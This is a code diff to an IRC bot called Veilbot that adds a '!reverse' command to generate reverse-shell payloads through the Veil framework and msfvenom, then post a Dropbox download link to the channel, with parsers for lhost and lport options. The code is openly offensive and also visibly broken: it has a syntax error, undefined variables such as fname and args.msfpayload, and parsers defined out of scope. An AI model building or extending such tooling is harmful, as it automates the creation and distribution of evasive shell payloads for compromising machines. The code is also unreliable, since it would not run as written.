@@ -67,7 +67,7 @@ class Veilbot(irc.IRCClient):
         'nickname': "veil",
         'realname': "Veilbot",
     }
-    addShareParser = ArgumentParser()
+    bindShellParser = ArgumentParser()
 
     def initialize(self):
         ''' 
@@ -83,6 +83,21 @@ class Veilbot(irc.IRCClient):
             "!reverse": self.addShare,
             "!history": self.history,
         }
+        # Command parsers
+        reverseShellParser = argparse.ArgumentParser()
+        reverseShellParser.add_argument('--lhost', '-h',
+            dest='lhost'
+            required=True,
+        )
+        reverseShellParser.add_argument('--lport', '-p',
+            dest='lport',
+            default="4444",
+        )
+        bindShellParser = argparse.ArgumentParser()
+        bindShellParser.add_argument('--lport', '-p',
+            dest='lport',
+            default="4444",
+        )
 
     def __dbinit__(self):
         ''' Initializes the SQLite database '''
@@ -210,25 +225,54 @@ class Veilbot(irc.IRCClient):
             dbsession.flush()
 
     # Actual commands
-    def bind(self, nick, channel, msg):
+    def bind(self, user, channel, msg):
         ''' Create a bind shell '''
         pass
 
-    def reverse(self, nick, channel, msg):
+    def reverse(self, user, channel, msg):
         ''' Create a reverse shell '''
-        pass
+        args = reverseShellParser.parse_args(msg)
+        fpath = self.__generate__(args)
+        url = self.__dropbox__(fpath)
+        self.display(user, channel, "Shell Download: %s" % (url,))
+    
+    def __generate__(self, args): 
+        ''' Gerenate shell with args '''
+        controller = controller.Controller()
+        options = {}
+        if args.c:
+            options['required_options'] = {}
+            for option in args.c:
+                name,value = option.split("=")
+                options['required_options'][name] = [value, ""]
+        # pull out any msfvenom payloads/options
+        if args.msfpayload:
+            if args.msfoptions:
+                options['msfvenom'] = [args.msfpayload, args.msfoptions]
+            else:
+                options['msfvenom'] = [args.msfpayload, None]
+        # manually set the payload
+        controller.SetPayload(args.l, args.p, options)
+        outName = controller.OutputMenu(
+            controller.payload, 
+            controller.GeneratePayload(), 
+            showTitle=False, 
+            interactive=False, 
+            OutputBaseChoice=args.o
+        )
+        return outName
+
+    def __dropbox__(self, fpath):
+        ''' Get public dropbox link '''
+        # Copy file to dropbox
+        return DROPBOX_URI + fname
 
     def history(self, nick, channel, msg):
         ''' Retrieve a user's history '''
         user = User.by_nick(user)
 
     def help(self, nick, channel, msg):
-        ''' Displays a helpful message
-
-        --protocol https/http/tcp
-        !bind --lport 4545
-        !reverse --lport 4545 --lhost 192.168.1.1
-        '''
+        ''' Displays a helpful messages '''
         self.display(user, channel, " > Commands: Veilbot ")
         self.display(user, channel, "-------------------------------------")
         self.display(user, channel, "    !bind: Create a bind shell ")
